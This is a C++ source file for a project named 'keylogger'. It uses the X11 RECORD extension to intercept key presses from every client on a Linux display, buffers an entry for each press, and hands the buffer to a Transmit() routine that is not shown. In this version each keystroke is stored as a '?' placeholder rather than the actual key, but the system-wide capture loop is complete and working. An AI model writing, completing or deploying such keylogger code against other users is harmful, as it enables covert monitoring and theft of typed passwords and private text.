#include "recorder/event_loop.h"

#include <X11/X.h>

#include <atomic>
#include <cstdio>
#include <stdexcept>

#ifdef __linux__

#include <X11/Xlib.h>
#include <X11/Xlibint.h>
#include <X11/extensions/record.h>

static std::atomic_bool exit_event_loop(false);

/* refer to libxnee */
union XRecordDatum {
  unsigned char type;
  xEvent event;
  xResourceReq req;
  xGenericReply reply;
  xError error;
  xConnSetupPrefix setup;
};

void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
  if (hook->category != XRecordFromServer) {
    ::XRecordFreeData(hook);
    return;
  }

  keylogger::Recorder* recorder =
      reinterpret_cast<keylogger::Recorder*>(closure);
  (void)recorder;
  XRecordDatum* data = reinterpret_cast<XRecordDatum*>(hook->data);

  int event_type = data->type;
  BYTE keycode = data->event.u.u.detail;
  const int kEsc = 9;
  switch (event_type) {
    case KeyPress:
      if (keycode == kEsc) { /* if ESC is pressed at any time, exit */
        exit_event_loop = true;
      } else {
        recorder->BufferKeypress('?');
      }
      break;
    default:
      break;
  }
  ::XRecordFreeData(hook);
}

void keylogger::RecordKeypressEvents(keylogger::Recorder* recorder) {
  ::Display* ctrl_disp = XOpenDisplay(nullptr);
  ::Display* data_disp = XOpenDisplay(nullptr);
  if (!ctrl_disp || !data_disp) {
    throw std::runtime_error("unable to open X display");
  }

  int major = 0;
  int minor = 0;
  if (!::XRecordQueryVersion(ctrl_disp, &major, &minor)) {
    throw std::runtime_error("RECORD extension not supported on this X server");
  }

  /* we must set the ctrl_disp to sync mode, or, when we enable the context
   * in data_disp, there will be a fatal X error */
  ::XSynchronize(ctrl_disp, true);

  ::XRecordRange* record_rng = ::XRecordAllocRange();
  if (!record_rng) {
    throw std::runtime_error("could not alloc record range");
  }
  record_rng->device_events.first = KeyPress;
  record_rng->device_events.last = KeyRelease;

  ::XRecordClientSpec record_spec = XRecordAllClients;
  ::XRecordContext record_ctx =
      ::XRecordCreateContext(ctrl_disp, 0, &record_spec, 1, &record_rng, 1);
  if (!record_ctx) {
    throw std::runtime_error("could not create record context");
  }

  if (!::XRecordEnableContextAsync(data_disp, record_ctx, KeyCallback,
                                   reinterpret_cast<::XPointer>(recorder))) {
    throw std::runtime_error("could not enable record context");
  }

  while (!exit_event_loop) {
    ::XRecordProcessReplies(data_disp);
  }

  /* flush any remaining characters in the recorder */
  recorder->Transmit();

  ::XRecordDisableContext(ctrl_disp, record_ctx);
  ::XRecordFreeContext(ctrl_disp, record_ctx);
  ::XFree(record_rng);
  ::XCloseDisplay(data_disp);
  ::XCloseDisplay(ctrl_disp);
}

#endif
